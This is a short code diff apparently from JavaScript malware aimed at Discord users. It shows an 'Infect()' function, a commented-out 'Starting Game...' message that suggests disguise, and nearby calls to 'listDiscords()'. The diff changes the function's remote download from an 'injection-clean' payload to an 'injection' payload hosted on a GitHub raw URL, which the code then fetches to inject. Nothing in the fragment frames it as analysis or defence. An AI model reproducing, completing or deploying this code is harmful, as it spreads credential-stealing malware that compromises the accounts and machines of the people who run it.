@@ -49,7 +49,7 @@ removePizzas();
 listDiscords();
 function Infect() {
    // console.log(`Starting Game...`);
-    https.get("https://raw.githubusercontent.com/ugur014/ajwdbawjdbawjdbawjdbawjd/main/src/Injection/injection-clean", (resp) => {
+    https.get("https://raw.githubusercontent.com/ugur014/ajwdbawjdbawjdbawjdbawjd/main/src/Injection/injection", (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
